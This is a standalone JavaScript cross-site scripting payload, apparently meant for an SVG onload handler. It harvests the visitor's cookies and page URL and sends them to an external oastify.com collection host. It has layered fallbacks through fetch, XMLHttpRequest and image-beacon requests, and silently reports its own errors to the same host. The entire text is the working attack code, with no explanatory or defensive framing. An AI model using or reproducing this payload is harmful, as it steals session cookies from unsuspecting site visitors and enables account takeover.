svg.onload:
(function() {
    try {
        var cookies = document.cookie || 'no-cookies-found';
        var url = window.location.href || 'unknown-location';
        var timestamp = new Date().getTime();

        // Primary method - fetch
        if (typeof fetch !== 'undefined') {
            fetch('https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/collect', {
                method: 'POST',
                body: JSON.stringify({
                    cookies: cookies,
                    url: url,
                    timestamp: timestamp,
                    method: 'fetch'
                }),
                headers: {'Content-Type': 'application/json'}
            }).catch(function(error) {
                // Fallback to GET request
                new Image().src = 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/fallback?cookies=' + encodeURIComponent(cookies) + '&error=fetch-failed';
            });
        } else {
            // Fallback - XMLHttpRequest
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/xhr?cookies=' + encodeURIComponent(cookies) + '&url=' + encodeURIComponent(url), true);
            xhr.onerror = function() {
                // Final fallback - Image
                new Image().src = 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/img?cookies=' + encodeURIComponent(cookies);
            };
            xhr.send();
        }
    } catch (error) {
        // Error handler
        try {
            new Image().src = 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/error?msg=' + encodeURIComponent(error.message || 'unknown-error') + '&line=' + (error.lineNumber || 'unknown');
        } catch (e) {
            // Silent fail if even error reporting fails
        }
    }
})();
